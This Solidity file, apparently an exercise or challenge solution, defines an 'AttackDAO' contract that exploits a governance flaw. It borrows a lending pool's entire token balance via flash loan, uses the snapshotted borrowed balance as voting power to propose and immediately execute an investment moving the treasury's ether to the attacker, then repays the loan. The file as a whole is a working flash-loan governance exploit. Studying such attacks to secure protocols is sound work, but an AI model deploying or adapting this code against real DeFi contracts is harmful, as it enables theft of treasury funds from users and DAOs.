// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function suggestInvestment(address startup, uint256 amount) external returns (uint256);

    // function voteForInvestment(uint256 investmentId) external; --- IGNORE ---

    function executeInvestment(uint256 investmentId) external;
}

// Malicious contract that exploits the flash loan vulnerability
contract AttackDAO {
    address immutable token;
    address immutable lendingPool;
    address immutable governance;
    address immutable treasury;

    address owner;

    constructor(address _token, address _governance, address _lendingPool, address _treasury) {
        token = _token;
        governance = _governance;
        lendingPool = _lendingPool;
        treasury = _treasury;
        owner = msg.sender;
    }

    function executeAttack() external {
        require(msg.sender == owner, "Only owner can execute");
        // Take a flash loan and do everything in the callback
        IPool(lendingPool).flashLoan(IERC20(token).balanceOf(lendingPool));
    }

    function callBack(uint256 borrowAmount) external {
        require(msg.sender == lendingPool, "Only lending pool can call back");
        // We now have the borrowed tokens - snapshot will capture this balance

        // The vulnerability: snapshot captures our temporary borrowed balance
        // We suggest an investment with inflated voting power
        uint256 investmentId = IGovernance(governance).suggestInvestment(owner, treasury.balance);

        // Execute the investment immediately since we have >25% voting power
        IGovernance(governance).executeInvestment(investmentId);

        // Repay the flash loan
        IERC20(token).transfer(address(lendingPool), borrowAmount);
    }
}
